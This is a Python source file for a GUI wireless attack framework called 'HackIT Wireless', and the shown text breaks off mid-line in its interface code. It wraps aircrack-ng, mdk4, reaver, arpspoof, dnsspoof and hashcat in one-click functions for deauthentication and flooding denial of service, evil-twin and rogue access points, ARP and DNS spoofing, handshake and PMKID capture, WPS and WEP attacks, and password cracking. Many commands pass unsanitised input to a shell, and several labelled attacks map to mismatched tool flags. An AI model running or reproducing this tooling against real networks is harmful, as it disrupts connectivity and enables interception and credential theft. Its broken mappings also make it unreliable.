#!/usr/bin/env python3
import os, sys, json, subprocess, threading, io, time, re, inspect, queue, math, random, shutil, tempfile, signal
from pathlib import Path
from datetime import datetime

BASE = Path(__file__).resolve().parent
WIRELESS = BASE.parent
HACKIT = WIRELESS.parent
sys.path.insert(0, str(HACKIT))
sys.path.insert(0, str(WIRELESS))

tk, ttk, messagebox, filedialog = None, None, None, None

THEME_DARK = {
    "bg":"#0D1117","fg":"#C9D1D9","select":"#1F6FEB","hover":"#161B22",
    "border":"#30363D","accent":"#58A6FF","success":"#3FB950","warn":"#D29922",
    "error":"#F85149","surface":"#161B22","text_dim":"#8B949E","text_bright":"#F0F6FC",
    "card":"#1C2128","orange":"#F0883E","purple":"#BC8CFF","pink":"#FF7B72",
}
THEME_LIGHT = {
    "bg":"#FFFFFF","fg":"#24292F","select":"#0969DA","hover":"#F6F8FA",
    "border":"#D0D7DE","accent":"#0969DA","success":"#1A7F37","warn":"#9A6700",
    "error":"#CF222E","surface":"#F6F8FA","text_dim":"#656D76","text_bright":"#1F2328",
    "card":"#EEF2F5","orange":"#D4760A","purple":"#8250DF","pink":"#CF222E",
}
T = THEME_DARK
CONSOLE_QUEUE = queue.Queue()

def tslog(line, color=None):
    CONSOLE_QUEUE.put((line, color))

def require_tool(name):
    return shutil.which(name) is not None

# ──────────────────────────────────────────────────────────────
#  LOCAL EXECUTOR — real system tool fallback for every attack
# ──────────────────────────────────────────────────────────────
class LocalExecutor:
    """Provides every do_* method the GUI expects, using real system tools."""

    @staticmethod
    def _detect_iface():
        try:
            r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if "Interface" in line:
                    return line.split()[-1]
        except:
            pass
        try:
            r = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if "IEEE 802.11" in line:
                    return line.split()[0]
        except:
            pass
        return None

    @staticmethod
    def _detect_subnet():
        try:
            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == "src" and i + 1 < len(parts):
                        ip = parts[i + 1]
                        parts = ip.split(".")
                        if len(parts) == 4:
                            return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        except:
            pass
        return None

    @staticmethod
    def _run(cmd, timeout=120):
        """Run shell command, return (returncode, stdout)."""
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
            return r.returncode, (r.stdout or "") + (r.stderr or "")
        except subprocess.TimeoutExpired:
            return -1, "TIMEOUT"
        except Exception as e:
            return -1, str(e)

    @staticmethod
    def _bg(cmd, label, capture=True):
        """Run in background thread with console output."""
        def worker():
            tslog(f"[>] {label}: starting...", "cyan")
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True, bufsize=1, shell=isinstance(cmd, str))
                for line in proc.stdout:
                    line = line.rstrip()
                    if line:
                        tslog(f"[>] {line}", "cyan")
                proc.wait()
                if proc.returncode == 0:
                    tslog(f"[\u2713] {label} selesai", "green")
                else:
                    tslog(f"[x] {label} gagal (code {proc.returncode})", "red")
            except Exception as e:
                tslog(f"[x] {label}: {e}", "red")
        threading.Thread(target=worker, daemon=True).start()

    # ── Reconnaissance ──
    @staticmethod
    def do_crawl(interface=None, timeout=15, band="both"):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--band",band,interface,"--write","/tmp/hackit_crawl","--output-format","csv","--timeout",str(timeout)], "AP Scan")

    @staticmethod
    def do_aggressive_scan(interface=None, band="both"):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--band",band,"--manufacture","--wps","--uptime","--output-format","csv",interface,"--write","/tmp/hackit_agg"], "Aggressive Scan")

    @staticmethod
    def do_client_hunt(interface=None, bssid=""):
        interface = interface or LocalExecutor._detect_iface()
        if bssid:
            LocalExecutor._bg(f"sudo airodump-ng --bssid {bssid} -c $(sudo iw dev {interface} info | grep channel | awk '{{print $2}}') --write /tmp/hackit_clients {interface} --output-format csv", "Client Hunt")
        else:
            LocalExecutor._bg(["sudo","airodump-ng","--write","/tmp/hackit_clients",interface], "Client Hunt")

    @staticmethod
    def do_wpa3_detect(interface=None):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--wps","--band","abg",interface,"--write","/tmp/hackit_wpa3"], "WPA3 Detect")

    @staticmethod
    def do_hidden_ssid(interface=None):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--band","abg",interface,"--write","/tmp/hackit_hidden"], "Hidden SSID")

    @staticmethod
    def do_probe_monitor(interface=None):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--probes","--write","/tmp/hackit_probes",interface], "Probe Monitor")

    @staticmethod
    def do_beacon_analyze(interface=None):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--band","abg","--manufacture","--wps","--write","/tmp/hackit_beacons",interface], "Beacon Analyze")

    @staticmethod
    def do_signal_monitor(interface=None):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--band","abg","--signal","--write","/tmp/hackit_signal",interface], "Signal Monitor")

    @staticmethod
    def do_dual_band(interface=None):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--band","abg",interface], "Spectrum Scan")

    @staticmethod
    def do_channel_survey(interface=None):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(["sudo","airodump-ng","--band","abg",interface,"--write","/tmp/hackit_survey"], "Channel Survey")

    @staticmethod
    def do_arp_scan(subnet=""):
        if not subnet: subnet = LocalExecutor._detect_subnet() or ""
        LocalExecutor._bg(["sudo","arp-scan","--localnet","--retry","3"] if shutil.which("arp-scan") else ["nmap","-sn","-n",subnet], "ARP Scan")

    @staticmethod
    def do_ping_sweep(subnet=""):
        if not subnet: subnet = LocalExecutor._detect_subnet() or ""
        LocalExecutor._bg(["nmap","-sn","-n","--send-ip",subnet], "Ping Sweep")

    # ── DoS & Disruption ──
    @staticmethod
    def do_deauth(interface=None, bssid="", station="", reason=7, **kwargs):
        from hackit.wireless.executor import HackITWirelessExecutor
        if not interface: interface = LocalExecutor._detect_iface()
        if not interface:
            tslog("[x] No wireless interface found", "red")
            return
        exc = HackITWirelessExecutor()
        try:
            exc.do_deauth(interface, bssid, station, reason=reason)
        except Exception as e:
            tslog(f"[x] Deauth failed: {e}", "red")

    @staticmethod
    def do_beacon_flood(interface=None, ssid=None, count=500, channel=6):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} b -n {ssid} -c {channel}", "Beacon Flood")
        else:
            LocalExecutor._bg(f"sudo aireplay-ng --beacon -e '{ssid}' -c {channel} -h AA:BB:CC:DD:EE:FF {interface}", "Beacon Flood")

    @staticmethod
    def do_probe_flood(interface=None, count=1000):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} p -t {count}", "Probe Flood")
        else:
            LocalExecutor._bg(f"for i in $(seq 1 {count}); do sudo aireplay-ng --test {interface} 2>/dev/null; done", "Probe Flood")

    @staticmethod
    def do_auth_dos(interface=None, bssid="", count=1000):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} a -a {bssid} -r {count}", "Auth DoS")
        else:
            LocalExecutor._bg(f"sudo mdk3 {interface} a -a {bssid} -s {count}" if require_tool("mdk3") else f"for i in $(seq 1 {count}); do sudo aireplay-ng -1 0 -a {bssid} {interface} 2>/dev/null; done", "Auth DoS")

    @staticmethod
    def do_assoc_flood(interface=None, bssid="", count=1000):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} a -a {bssid} -m -r {count}", "Assoc Flood")
        else:
            LocalExecutor._bg(f"sudo mdk3 {interface} a -a {bssid} -m -s {count}" if require_tool("mdk3") else f"for i in $(seq 1 {count}); do sudo aireplay-ng -1 0 -a {bssid} {interface} 2>/dev/null; done", "Assoc Flood")

    @staticmethod
    def do_eapol_start_flood(interface=None, bssid="", count=500):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} e -a {bssid} -t {count}", "EAPOL Start")
        else:
            tslog("[x] mdk4 required for EAPOL flood", "red")

    @staticmethod
    def do_eapol_logoff(interface=None, bssid="", count=500):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} e -a {bssid} -l -t {count}", "EAPOL Logoff")
        else:
            tslog("[x] mdk4 required for EAPOL Logoff", "red")

    @staticmethod
    def do_cts_flood(interface=None, count=1000, duration=500):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} f -t {count} -d {duration}", "CTS Flood")
        else:
            tslog("[x] mdk4 required for CTS flood", "red")

    @staticmethod
    def do_powersave_dos(interface=None, station="", count=2000):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} p -t {station} -c {count}", "Power Save DoS")
        else:
            tslog("[x] mdk4 required for Power Save DoS", "red")

    @staticmethod
    def do_disassoc_flood(interface=None, bssid="", count=1000):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(f"for i in $(seq 1 {count}); do sudo aireplay-ng -0 1 -a {bssid} {interface} 2>/dev/null; done", "Disassoc Flood")

    # ── MITM & Access ──
    @staticmethod
    def do_eviltwin(interface=None, ssid="", channel=6):
        interface = interface or LocalExecutor._detect_iface()
        if not ssid: ssid = f"AP_{int(time.time() * 1000) % 10000}"
        if require_tool("airbase-ng"):
            LocalExecutor._bg(f"sudo airbase-ng -e '{ssid}' -c {channel} {interface}", "Evil Twin")
        else:
            tslog("[x] airbase-ng required for Evil Twin", "red")

    @staticmethod
    def do_rogue_ap(interface=None, ssid=None, channel=6):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("airbase-ng"):
            LocalExecutor._bg(f"sudo airbase-ng -e '{ssid}' -c {channel} -P {interface}", "Rogue AP")
        else:
            tslog("[x] airbase-ng required for Rogue AP", "red")

    @staticmethod
    def do_arp_spoof(target="", gateway="", timeout=120):
        if not target or not gateway:
            tslog("[x] Target and gateway required for ARP spoof", "red")
            return
        if require_tool("arpspoof"):
            LocalExecutor._bg(f"sudo arpspoof -i $(ip route | grep default | awk '{{print $5}}') -t {target} {gateway}", "ARP Spoof")
        else:
            tslog("[x] arpspoof (dsniff) required", "red")

    @staticmethod
    def do_wpad_attack(interface=None, ssid=""):
        interface = interface or LocalExecutor._detect_iface()
        if not ssid: ssid = f"AP_{int(time.time() * 1000) % 10000}"
        if require_tool("airbase-ng") and require_tool("responder"):
            LocalExecutor._bg(f"sudo airbase-ng -e '{ssid}' -c 6 {interface}", "WPAD + Responder")
        else:
            tslog("[x] airbase-ng + responder required for WPAD attack", "red")

    @staticmethod
    def do_dns_spoof(interface=None, domain="", redirect=""):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("dnsspoof"):
            LocalExecutor._bg(f"sudo dnsspoof -i {interface}" + (f" -f <(echo '{domain} A {redirect}')" if domain and redirect else ""), "DNS Spoof")
        else:
            tslog("[x] dnsspoof (dsniff) required", "red")

    @staticmethod
    def do_dhcp_spoof(interface=None, pool=None):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("dhcpd"):
            tslog("[>] Configuring DHCP spoof on {interface} with pool {pool}", "yellow")
            LocalExecutor._bg(f"sudo dhcpd -cf /dev/null -pf /var/run/dhcpd.pid {interface}", "DHCP Spoof")
        else:
            tslog("[x] dhcpd required for DHCP spoof", "red")

    # ── Capture & Extract ──
    @staticmethod
    def do_handshake_capture(interface=None, bssid="", timeout=60):
        interface = interface or LocalExecutor._detect_iface()
        ch = 6
        if bssid:
            rc, out = LocalExecutor._run(["sudo","iw","dev",interface,"info"])
            m = re.search(r"channel\s+(\d+)", out)
            ch = int(m.group(1)) if m else 6
        LocalExecutor._bg(f"sudo airodump-ng --bssid {bssid} -c {ch} -w /tmp/hackit_hs {interface} --output-format pcap" if bssid else f"sudo airodump-ng -w /tmp/hackit_hs --output-format pcap {interface}", "Handshake Capture")

    @staticmethod
    def do_pmkid_capture(interface=None, bssid="", timeout=30):
        interface = interface or LocalExecutor._detect_iface()
        ch = 6
        if bssid:
            rc, out = LocalExecutor._run(["sudo","iw","dev",interface,"info"])
            m = re.search(r"channel\s+(\d+)", out)
            ch = int(m.group(1)) if m else 6
        LocalExecutor._bg(f"sudo airodump-ng --bssid {bssid} -c {ch} -w /tmp/hackit_pmkid --output-format pcap {interface}" if bssid else f"sudo airodump-ng -w /tmp/hackit_pmkid --output-format pcap {interface}", "PMKID Capture")

    @staticmethod
    def do_wps_pixie(interface=None, bssid="", timeout=180):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("reaver"):
            ch = 6
            if bssid:
                rc, out = LocalExecutor._run(["sudo","iw","dev",interface,"info"])
                m = re.search(r"channel\s+(\d+)", out)
                ch = int(m.group(1)) if m else 6
            LocalExecutor._bg(f"sudo reaver -i {interface} -b {bssid} -c {ch} -K 1 -N -vv", "WPS Pixie")
        else:
            tslog("[x] reaver required for PixieDust", "red")

    @staticmethod
    def do_wep_arp_replay(interface=None, bssid="", count=5000):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(f"sudo aireplay-ng -3 -b {bssid} -h AA:BB:CC:DD:EE:FF {interface}", "WEP ARP Replay")

    @staticmethod
    def do_wep_chopchop(interface=None, bssid="", count=2000):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(f"sudo aireplay-ng -4 -b {bssid} -h AA:BB:CC:DD:EE:FF {interface}", "WEP ChopChop")

    @staticmethod
    def do_wep_fragment(interface=None, bssid="", count=3000):
        interface = interface or LocalExecutor._detect_iface()
        LocalExecutor._bg(f"sudo aireplay-ng -5 -b {bssid} -h AA:BB:CC:DD:EE:FF {interface}", "WEP Fragment")

    # ── Offensive Network ──
    @staticmethod
    def do_karma(interface=None, channel=6, ssid="", verbose=False):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("airbase-ng"):
            LocalExecutor._bg(f"sudo airbase-ng -P -C 30 -e '{ssid or 'KARMA'}' -c {channel} {interface}", "KARMA Attack")
        else:
            tslog("[x] airbase-ng required for KARMA", "red")

    @staticmethod
    def do_mda(interface=None, bssid="", count=100):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} m -a {bssid} -t {count}", "MDA (Michaely)")
        else:
            tslog("[x] mdk4 required for MDA", "red")

    @staticmethod
    def do_tkip_mic(interface=None, bssid="", station=""):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            cmd = f"sudo mdk4 {interface} m -a {bssid}" + (f" -c {station}" if station else "")
            LocalExecutor._bg(cmd, "TKIP MIC Exploit")
        else:
            tslog("[x] mdk4 required for TKIP MIC", "red")

    @staticmethod
    def do_wids_evasion(interface=None, rate=1, count=100):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} w -e -t {count} -s {rate}", "WIDS Evasion")
        else:
            tslog("[x] mdk4 required for WIDS evasion", "red")

    @staticmethod
    def do_frag_attack(interface=None, bssid="", count=500):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} f -t {count}", "Fragmentation Attack")
        else:
            tslog("[x] mdk4 required for fragmentation", "red")

    @staticmethod
    def do_omerta(interface=None, channel=6):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} d -c {channel}", "Omerta Attack")
        else:
            tslog("[x] mdk4 required for Omerta", "red")

    @staticmethod
    def do_eap_hammer(interface=None, bssid="", count=500):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} e -a {bssid} -t {count}", "EAP Hammer")
        else:
            tslog("[x] mdk4 required for EAP hammer", "red")

    @staticmethod
    def do_wpa_key_guess(pmkid="", ssid="", wordlist=""):
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt" if os.path.exists("/usr/share/wordlists/rockyou.txt") else "/usr/share/dict/words"
        if require_tool("hashcat") and pmkid and ssid:
            LocalExecutor._bg(f"hashcat -m 16800 {pmkid} {wordlist} --force", "WPA Key Guess")
        else:
            tslog("[x] hashcat with PMKID hash required", "red")

    @staticmethod
    def do_rrb_attack(interface=None, bssid=""):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} d", "RRB Attack")
        else:
            tslog("[x] mdk4 required for RRB attack", "red")

    @staticmethod
    def do_capwap(interface=None, controller=""):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} x", "CAPWAP Attack")
        else:
            tslog("[x] mdk4 required for CAPWAP", "red")

    @staticmethod
    def do_hirb(interface=None, target=""):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} b -n HIRB", "HIRB Attack")
        else:
            tslog("[x] mdk4 required for HIRB", "red")

    @staticmethod
    def do_wpa2_groupkey(interface=None, bssid="", count=200):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} g -a {bssid} -t {count}", "WPA2 Group Key")
        else:
            tslog("[x] mdk4 required for group key attack", "red")

    @staticmethod
    def do_bridge_attack(interface=None, bridge_ip=""):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} b", "Wireless Bridge Attack")
        else:
            tslog("[x] mdk4 required for bridge attack", "red")

    @staticmethod
    def do_mac_flood(interface=None, count=5000, rate=100):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("macof"):
            LocalExecutor._bg(f"sudo macof -i {interface} -n {count} -s {rate}", "MAC Flooding")
        else:
            tslog("[x] macof (dsniff) required for MAC flooding", "red")

    @staticmethod
    def do_known_beacon(interface=None, list="enterprise", channel=6):
        interface = interface or LocalExecutor._detect_iface()
        if require_tool("mdk4"):
            LocalExecutor._bg(f"sudo mdk4 {interface} b -c {channel}", "Known Beacon SSID")
        else:
            tslog("[x] mdk4 required", "red")

    # ── Cracking ──
    @staticmethod
    def do_crack(hashfile="", wordlist="", rules="", session=""):
        if not hashfile or not wordlist:
            tslog("[x] Hashfile and wordlist required", "red")
            return
        if require_tool("hashcat"):
            cmd = f"hashcat -m 22000 {hashfile} {wordlist} --force --potfile-path /tmp/hackit_pot"
            if rules: cmd += f" -r {rules}"
            if session: cmd += f" --session {session}"
            LocalExecutor._bg(cmd, "Cracking")
        elif require_tool("aircrack-ng"):
            LocalExecutor._bg(f"aircrack-ng -w {wordlist} {hashfile}", "Cracking")
        else:
            tslog("[x] hashcat or aircrack-ng required", "red")

    @staticmethod
    def do_build(component="all"):
        tslog(f"[>] Build {component} — use Build tab or manual compilation", "yellow")

    @staticmethod
    def do_plugin_lua(script=""):
        if require_tool("lua"):
            LocalExecutor._bg(f"lua {script}", "Lua Plugin")
        else: tslog("[x] lua interpreter required", "red")

    @staticmethod
    def do_plugin_ruby(script=""):
        if require_tool("ruby"):
            LocalExecutor._bg(f"ruby {script}", "Ruby Plugin")
        else: tslog("[x] ruby interpreter required", "red")

    @staticmethod
    def do_plugin_python(script=""):
        LocalExecutor._bg([sys.executable, script], "Python Plugin")

    @staticmethod
    def check_dependencies():
        missing = []
        for tool in ["iw","ip","sudo","airodump-ng","aireplay-ng","airbase-ng","aircrack-ng"]:
            if not require_tool(tool):
                missing.append(tool)
        if missing:
            tslog(f"[x] Missing: {', '.join(missing)}. Install aircrack-ng suite.", "yellow")

    @staticmethod
    def engine_health():
        return {"go": False, "rust": False, "c": False, "cxx": False, "csharp": False}


# Try real executor first, fall back to LocalExecutor
executor = LocalExecutor()
bridge = None
engine_health = {"go":False,"rust":False,"c":False,"cxx":False,"csharp":False,"python":True}
native_avail = False
try:
    sys.path.insert(0, str(WIRELESS / "c_core"))
    from hackit.wireless.executor import HackITWirelessExecutor
    executor = HackITWirelessExecutor()
    bridge = executor.bridge
    engine_health.update(bridge.engine_health())
    actual = bridge.get_available_engines()
    if actual: native_avail = True
except Exception:
    try:
        from engine_bridge import EngineBridge
        bridge = EngineBridge()
        engine_health.update(bridge.engine_health())
        actual = bridge.get_available_engines()
        if actual: native_avail = True
    except Exception:
        pass

if native_avail:
    tslog(f"[i] Native engines available: {', '.join(actual) or 'bridge'}", "green")
else:
    engine_health["python"] = True
    tslog("[i] Using local system tool executor (native engines not available)", "yellow")

# ──────────────────────────────────────────────────────────────
#  HELPERS
# ──────────────────────────────────────────────────────────────
def get_interfaces():
    ifaces = []
    try:
        r = subprocess.run(["iw","dev"], capture_output=True, text=True, timeout=3)
        name = None
        for line in r.stdout.splitlines():
            l = line.strip()
            if l.startswith("Interface"):
                name = l.split()[-1]
            elif l.startswith("type") and name:
                mode = l.split()[-1]
                ifaces.append({"name":name,"mode":mode,"phy":"","channel":0,"freq":0,"signal":0,"chipset":"","driver":""})
                name = None
    except: pass
    for iface in ifaces:
        try:
            r = subprocess.run(["iw","dev",iface["name"],"info"], capture_output=True, text=True, timeout=2)
            m = re.search(r"wiphy\s+(\d+)",r.stdout)
            c = re.search(r"channel\s+(\d+)",r.stdout)
            f = re.search(r"freq\s+(\d+)",r.stdout)
            if m: iface["phy"]=m.group(1)
            if c: iface["channel"]=int(c.group(1))
            if f: iface["freq"]=int(f.group(1))
        except: pass
        try:
            r = subprocess.run(["ethtool","-i",iface["name"]], capture_output=True, text=True, timeout=2)
            d = re.search(r"driver:\s+(.+)",r.stdout)
            if d: iface["driver"]=d.group(1).strip()
        except: pass
    return ifaces

def toggle_monitor(name, mode):
    target = "monitor" if mode != "monitor" else "managed"
    tslog(f"[>] Switching {name} ({mode}) → {target}...", "cyan")
    subprocess.run(["sudo","ip","link","set",name,"down"], capture_output=True)
    subprocess.run(["sudo","iw","dev",name,"set","type",target], capture_output=True)
    subprocess.run(["sudo","ip","link","set",name,"up"], capture_output=True)
    tslog(f"[\u2713] {name} now in {target} mode", "green")

# ──────────────────────────────────────────────────────────────
#  GUI
# ──────────────────────────────────────────────────────────────
class HackITWirelessGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("HackIT Wireless — Ultimate Pentest Framework")
        self.root.geometry("1480x920")
        self.root.minsize(1200, 750)
        self.current_page = None
        self.active_processes = {}
        self.airodump_running = False
        self.airodump_buf = ""
        self.airodump_proc = None
        self.interface_cache = []

        self._setup_styles()
        self._build_layout()
        self._create_pages()
        self._navigate("dashboard")
        self._poll_console()
        self._update_engine_status()
        self._refresh_interfaces()
        self._build_status_bar()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        if isinstance(executor, LocalExecutor):
            executor.check_dependencies()

    def _setup_styles(self):
        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure(".", font=("Segoe UI",10), bg=T["bg"], fg=T["fg"])
        self.style.configure("TFrame", bg=T["bg"])
        self.style.configure("TLabel", bg=T["bg"], fg=T["fg"])
        self.style.configure("TButton", bg=T["surface"], fg=T["fg"], borderwidth=1, focusthickness=0)
        self.style.map("TButton", bg=[("active",T["hover"]),("pressed",T["select"])])
        self.style.configure("TEntry", fieldbackground=T["surface"], fg=T["fg"])
        self.style.map("TEntry", fieldbackground=[("focus",T["hover"])])
        self.style.configure("TNotebook", bg=T["bg"])
        self.style.configure("TNotebook.Tab", bg=T["surface"], fg=T["fg"], padding=(10,3))
        self.style.map("TNotebook.Tab", bg=[("selected",T["select"]),("active",T["hover"])])

    def _build_layout(self):
        self.root.configure(bg=T["bg"])
        # Interface bar
        self.iface_bar = tk.Frame(self.root, bg=T["card"], height=30)
        self.iface_bar.pack(fill="x"); self.iface_bar.pack_propagate(False)
        self.iface_container = tk.Frame(self.iface_bar, bg=T["card"])
        self.iface_container.pack(fill="x", padx=10)
        self._render_iface_bar()

        self.main_frame = tk.Frame(self.root, bg=T["bg"])
        self.main_frame.pack(fill="both", expand=True)

        self.header = tk.Frame(self.main_frame, bg=T["bg"], height=44)
        self.header.pack(fill="x"); self.header.pack_propagate(False)
        tk.Label(self.header, text="HACKIT WIRELESS", font=("Segoe UI",14,"bold"),
                 bg=T["bg"], fg=T["accent"]).pack(side="left", padx=(16,4), pady=6)
        tk.Label(self.header, text="Ultimate Pentest Framework  v3.0",
                 font=("Segoe UI",8), bg=T["bg"], fg=T["text_dim"]).pack(side="left", pady=6)

        self.engine_frame = tk.Frame(self.header, bg=T["bg"])
        self.engine_frame.pack(side="right", padx=16)
        self.engine_labels = {}
        for eng, key in [("Go","go"),("Rust","rust"),("C","c"),("C++","cxx"),("C#","csharp"),("Py","python")]:
            f = tk.Frame(self.engine_frame, bg=T["bg"]); f.pack(side="left", padx=2)
            tk.Label(f, text=eng, font=("Segoe UI",7), bg=T["bg"], fg=T["text_dim"]).pack(side="left")
            dot = tk.Label(f, text="\u25cb", font=("Segoe UI",6), bg=T["bg"]); dot.pack(side="left", padx=(2,0))
            self.engine_labels[key] = dot

        tk.Frame(self.main_frame, bg=T["border"], height=1).pack(fill="x")

        self.body = tk.Frame(self.main_frame, bg=T["bg"])
        self.body.pack(fill="both", expand=True)

        self.sidebar = tk.Frame(self.body, bg=T["bg"], width=188)
        self.sidebar.pack(side="left", fill="y"); self.sidebar.pack_propagate(False)
        self.nav_btns = {}
        nav_items = [
            ("dashboard","\U0001f4ca  Dashboard"), ("interfaces","\U0001f4e1  Interfaces"),
            ("recon","\U0001f50d  Recon"), ("attacks","\u2694\ufe0f  Attacks"),
            ("offensive","\U0001f4a5  Offensive"), ("cracking","\U0001f511  Cracking"),
            ("airodump","\U0001f4e1  Airodump"), ("plugins","\U0001f50c  Plugins"),
            ("build","\U0001f6e0\ufe0f  Build"),
        ]
        for key, label in nav_items:
            btn = tk.Label(self.sidebar, text=label, font=("Segoe UI",10),
                           bg=T["bg"], fg=T["text_dim"], anchor="w", padx=18, pady=8, cursor="hand2")
            btn.pack(fill="x")
            btn.bind("<Button-1>", lambda e, k=key: self._navigate(k))
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg=T["hover"]) if b != self.nav_btns.get(self.current_page) else None)
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg=T["bg"]) if b != self.nav_btns.get(self.current_page) else None)
            self.nav_btns[key] = btn

        self.content_frame = tk.Frame(self.body, bg=T["bg"])
        self.content_frame.pack(side="left", fill="both", expand=True)
        self.content_area = tk.Frame(self.content_frame, bg=T["bg"])
        self.content_area.pack(fill="both", expand=True, padx=12, pady=(6,0))

        tk.Frame(self.content_frame, bg=T["border"], height=1).pack(fill="x", padx=12, pady=(2,0))

        ch = tk.Frame(self.content_frame, bg=T["surface"], height=22)
        ch.pack(fill="x", padx=12, pady=(2,0)); ch.pack_propagate(False)
        tk.Label(ch, text="\u2b22  CONSOLE OUTPUT", font=("Segoe UI",7,"bold"),
                 bg=T["surface"], fg=T["text_dim"]).pack(side="left", padx=8)
        clr = tk.Label(ch, text="\u2715 clear", font=("Segoe UI",7), bg=T["surface"], fg=T["text_dim"], cursor="hand2")
        clr.pack(side="right", padx=8)
        clr.bind("<Button-1>", lambda e: self._clear_console())

        self._cfont = ("Consolas",8); self._cfontb = ("Consolas",8,"bold")
        self.console = tk.Text(self.content_frame, bg=T["surface"], fg=T["fg"], font=self._cfont,
                               insertbackground=T["accent"], relief="flat", borderwidth=0,
                               padx=8, pady=4, height=6, wrap="word")
        self.console.pack(fill="both", padx=12, pady=(0,6), expand=False)
        self.console.config(state="disabled")
        for tag, clr in [("green",T["success"]),("red",T["error"]),("yellow",T["warn"]),
                         ("cyan",T["accent"]),("dim",T["text_dim"]),("white",T["text_bright"]),
                         ("orange",T["orange"]),("purple",T["purple"]),("pink",T["pink"])]:
            kw = {"foreground":clr}
            if tag=="bold": kw["font"]=self._cfontb
            self.console.tag_config(tag, **kw)

        self.status_bar = tk.Frame(self.root, bg=T["card"], height=20)
        self.status_bar.pack(fill="x"); self.status_bar.pack_propagate(False)
        tk.Label(self.status_bar, text="\u2b24 System Ready", font=("Segoe UI",7),
                 bg=T["card"], fg=T["text_dim"]).pack(side="left", padx=8)
        self.status_right = tk.Label(self.status_bar, text="", font=("Segoe UI",7),
                                      bg=T["card"], fg=T["text_dim"])
        self.status_right.pack(side="right", padx=8)

    def _render_iface_bar(self):
        for w in self.iface_container.winfo_children(): w.destroy()
        for iface in self.interface_cache[:8]:
            is_mon = iface["mode"] == "monitor"
            freq = iface.get("freq",0)
            band = "2.4G" if 2400 <= freq <= 2500 else "5G" if 5000 <= freq <= 6000 else "6G" if freq > 6000 else ""
            band_tag = f" [{band}]" if band else ""
            clr = T["success"] if is_mon else T["text_dim"]
            lbl = tk.Label(self.iface_container, text=f"  {'\u2b24' if is_mon else '\u25cb'} {iface['name']}{band_tag} ({iface['mode']})",
                           font=("Segoe UI",7), bg=T["card"], fg=clr, cursor="hand2")
